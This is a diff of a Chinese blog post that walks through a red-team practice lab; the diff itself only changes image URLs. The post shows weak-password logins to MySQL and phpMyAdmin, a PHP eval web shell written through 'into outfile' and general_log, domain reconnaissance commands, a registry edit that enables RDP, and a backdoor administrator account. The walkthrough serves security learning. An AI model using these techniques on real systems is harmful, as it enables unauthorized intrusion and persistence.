@@ -134,20 +134,20 @@
 <p>第一个靶场选择了<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">红日ATT&amp;CK实战系列 红队（一）</a> 据说比较基础（危）所以搭好环境来学习了</p>
 <p>想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。</p>
 <h1 id="正式开张"><a href="#正式开张" class="headerlink" title="正式开张"></a>正式开张</h1><h2 id="信息收集-stage-1"><a href="#信息收集-stage-1" class="headerlink" title="信息收集 stage-1"></a>信息收集 stage-1</h2><p>nmap进攻性扫描</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409151409.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409151409.png"></p>
 <p>3389没开</p>
 <p>80端口跑的是php探针，泄漏了不少信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409154201.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409154201.png"></p>
 <p>探针泄漏可遇不可求啊，把页面保存下来，能为后续操作提供不少方便的说</p>
 <p>下面还有个MySQL数据库连接检测，弱密码<code>root/root</code>直接验证成功了，太棒了</p>
 <p>dirsearch扫一扫目录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409174228.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409174228.png"></p>
 <p>扫到phpMyAdmin后台，弱密码<code>root/root</code>成功登陆</p>
 <h2 id="getshell-stage-1"><a href="#getshell-stage-1" class="headerlink" title="getshell stage-1"></a>getshell stage-1</h2><p>都拿到phpMyAdmin了写shell的方法还是挺多的。</p>
 <p>由于从探针中我们得知了网页绝对路径，所以可首先试试sql的<code>select xxx into outfile</code>语句将shell写入外部文件</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409181651.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409181651.png"></p>
 <p>报错了不让执行的说</p>
 <blockquote>
 <p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
@@ -165,56 +165,56 @@
 </blockquote>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409202901.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409202901.png"></p>
 <p>开启<code>general_log</code></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409205015.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409205015.png"></p>
 <p>往日志文件写shell</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>蚁剑连接shell.php成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409205354.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409205354.png"></p>
 <p>（这种情况下改动过的各种设置关不关回去其实也已经……无所谓了……动作太大 悲）</p>
 <p>另一条getshell的路是从cms后台入手</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409211332.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409211332.png"></p>
 <p>登陆后台后同样能获取一些敏感信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409212247.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409212247.png"></p>
 <p>我们在前台模板设置中能看到所有的模板文件，存放路径可以通过对应cms的默认目录结构查找到。退一步讲，即使不知道模板的存放路径在哪，通过文件名和内容要是能猜出它们渲染的页面，也多是一件美逝啊</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409213030.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409213030.png"></p>
 <p>往index_index.php文件里写入shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220409215611.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220409215611.png"></p>
 <p>保存后蚁剑连接网站index.php成功。</p>
 <p>同时后台也提供了SQL执行的接口，可故技重施</p>
 <p>当然我们还可以通过cms本身的漏洞从后台外打进去，这里就不再展开了的说。</p>
 <h2 id="信息收集-stage-2"><a href="#信息收集-stage-2" class="headerlink" title="信息收集 stage-2"></a>信息收集 stage-2</h2><p>我们发现拿到的是个管理员的shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410120103.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410120103.png"></p>
 <p>常用信息收集类命令</p>
 <blockquote>
 <p>ipconfig /all   查看本机ip，所在域<br>route print     打印路由信息<br>net view        查看局域网内其他主机名<br>arp -a          查看arp缓存<br>net start       查看开启了哪些服务<br>net share       查看开启了哪些共享<br>net share ipc$  开启ipc共享<br>net share c$    开启c盘共享<br>net use \192.168.xx.xx\ipc$ “” /user:””   与192.168.xx.xx建立空连接<br>net use \192.168.xx.xx\c$ “密码” /user:”用户名”  建立c盘共享<br>dir \192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件<br>​<br>net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 查看本机用户列表<br>net user /domain         查看域用户<br>net localgroup administrators   查看本地管理员组（通常会有域用户）<br>net view /domain         查看有几个域<br>net user 用户名 /domain   获取指定域用户的信息<br>net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    查看域中某工作组<br>net group “domain admins” /domain  查看域管理员的名字<br>net group “domain computers” /domain  查看域中的其他主机名<br>net group “domain controllers” /domain  查看域控制器（可能有多台）</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410170344.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410170926.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410170344.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410170926.png"></p>
 <p>查看路由</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410171345.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410171345.png"></p>
 <p>粗略整理一下得到的信息，该主机所在域为<strong>god.org</strong>，域控为<strong>OWA$<strong>，域管理员为</strong>Administrator</strong>，内网网段为<strong>192.168.52.0/24</strong>。</p>
 <p>ping一下域控</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410172156.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410172156.png"></p>
 <p>得知域控地址为<strong>192.168.52.138</strong>。</p>
 <h2 id="getshell-stage-2"><a href="#getshell-stage-2" class="headerlink" title="getshell stage-2"></a>getshell stage-2</h2><p>针对windows系统的渗透，很多时候使用图形界面更为方便</p>
 <p>尝试开启3389远程桌面连接端口</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3389</span>&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410173546.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410173546.png"></p>
 <p>再新建一个用户并拉进管理员组</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user h4ck @BtpgYsfhPv0tP /add</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators h4ck /add</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410211848.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410211848.png"></p>
 <p><del>（忘记截屏了）</del></p>
 <p>不要问为什么密码这么难记，问就是密码不满足密码策略要求怎么办 试了十多次才创建成功的说（悲</p>
 <p>等我拿下你之后指定没你好果汁吃熬（指第一个就把复杂密码策略扬了</p>
 <p>远程桌面连接，这里为了方便操作选择用linux平台的rdesktop</p>
 <p>以新管理员h4ck身份登录主机，30秒后，我们获得目标主机桌面，管理员的桌面session将被断开。但管理员的后台程序并不受影响，网站仍会正常服务。惊不惊动管理员大概率取决于安全防护程序的报警，或者对面的电脑桌前有没有人叭。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Felidaessolution/cloud/BUU/20220410211503.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/M1serry/cloud/BUU/20220410211503.png"></p>
 <p>这一段操作如此流畅的原因是防火墙是提前全关的，留下的痕迹也是数不胜数，后面会补上囸穿防火墙的各种姿势和后渗透痕迹清理的说。</p>
 <h2 id="信息收集-stage-3"><a href="#信息收集-stage-3" class="headerlink" title="信息收集 stage-3"></a>信息收集 stage-3</h2></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Computer-Networks/">Computer Networks</a><a class="post-meta__tags" href="/tags/Intranet-penetration/">Intranet penetration</a></div><div class="post_share"></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%A8%E6%88%BF%E6%89%A9%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">厨房扩建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">正式开张</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集 stage-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell-stage-1"><span class="toc-number">2.2.</span> <span class="toc-text">getshell stage-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-2"><span class="toc-number">2.3.</span> <span class="toc-text">信息收集 stage-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell-stage-2"><span class="toc-number">2.4.</span> <span class="toc-text">getshell stage-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-3"><span class="toc-number">2.5.</span> <span class="toc-text">信息收集 stage-3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/13/%5BDASCTF-SU%5Dall-web/" title="DASCTF X SU 三月春季挑战赛 web">DASCTF X SU 三月春季挑战赛 web</a><time datetime="2022-04-13T00:00:00.000Z" title="发表于 2022-04-13 00:00">2022-04-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/09/Intranet-penetration-0x01/" title="域肾透——从看懂到看开 0x01">域肾透——从看懂到看开 0x01</a><time datetime="2022-04-09T00:00:00.000Z" title="发表于 2022-04-09 00:00">2022-04-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/01/%5BNISA2022%5Dall-web/" title="NISACTF2022 web方向全复现">NISACTF2022 web方向全复现</a><time datetime="2022-04-01T00:00:00.000Z" title="发表于 2022-04-01 00:00">2022-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/28/rce-without-w-and-n/" title="无字母数字RCE初探">无字母数字RCE初探</a><time datetime="2022-03-28T00:00:00.000Z" title="发表于 2022-03-28 00:00">2022-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/20/%5BVN2022%5DInterestingPHP/" title="VNCTF2022 InterestingPHP 复现">VNCTF2022 InterestingPHP 复现</a><time datetime="2022-03-20T00:00:00.000Z" title="发表于 2022-03-20 00:00">2022-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By M1sery</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你最重要的人重逢</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
